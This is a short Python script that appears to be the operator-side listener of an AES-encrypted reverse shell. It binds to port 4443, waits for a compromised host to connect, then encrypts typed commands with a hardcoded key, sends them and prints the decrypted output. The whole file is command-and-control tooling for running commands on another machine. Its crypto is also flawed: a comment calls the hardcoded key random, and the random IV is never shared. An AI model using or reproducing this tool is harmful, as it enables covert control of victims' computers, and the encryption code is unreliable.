from Crypto.Cipher import AES
import socket
import base64
import os


# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# create a cipher object using the random secret
iv = os.urandom(16)
cipher = AES.new(secret,AES.MODE_CFB, iv)


c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4443))
c.listen(1)
s,a = c.accept()
print ("connecton from %s:%s" % (a[0], a[1]))
print("\n")
hostname = s.recv(1024)
print(hostname)


def command_control(command):
    encrypted = EncodeAES(cipher, command)
    s.sendto(encrypted,(a[0],a[1]))
    data = s.recv(1024)
    result = DecodeAES(cipher,data)
    print(result)


while 1:
    cmd = raw_input(" $ ")
    if cmd == "quit": break
    command_control(cmd)